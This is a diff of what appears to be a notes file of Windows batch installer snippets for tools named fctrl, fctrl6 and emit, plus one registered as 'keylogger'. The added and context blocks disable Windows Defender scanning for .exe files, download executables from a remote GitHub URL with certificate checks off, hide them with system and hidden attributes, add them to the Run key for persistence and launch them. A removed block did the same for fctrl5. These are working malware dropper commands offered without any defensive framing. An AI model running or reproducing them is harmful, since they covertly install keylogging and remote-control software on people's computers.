@@ -8,6 +8,15 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Ge
 cmd.exe /C start %appdata%\emit.exe --aeskey fe333581d9f246ee
 exit
 ```
+fctrl (latest) setup
+```
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
+curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/fctrl.exe --insecure --output %appdata%\fctrl.exe
+attrib +s +h +a %appdata%\fctrl.exe
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "fctrl" /d %appdata%\fctrl.exe /f
+cmd.exe /C start %appdata%\fctrl.exe
+exit
+```
 fctrl6 setup
 ```
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
@@ -24,14 +33,5 @@ curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/log
 attrib +s +h +a %appdata%\logger-online.exe
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "keylogger" /d %appdata%\logger-online.exe /f
 cmd.exe /C start %appdata%\logger-online.exe
-exit
-```
-fctrl5 setup
-```
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
-curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/fctrl5.exe --insecure --output %appdata%\fctrl5.exe
-attrib +s +h +a %appdata%\fctrl5.exe
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "fctrl5" /d %appdata%\fctrl5.exe /f
-cmd.exe /C start %appdata%\fctrl5.exe
 exit
 ```
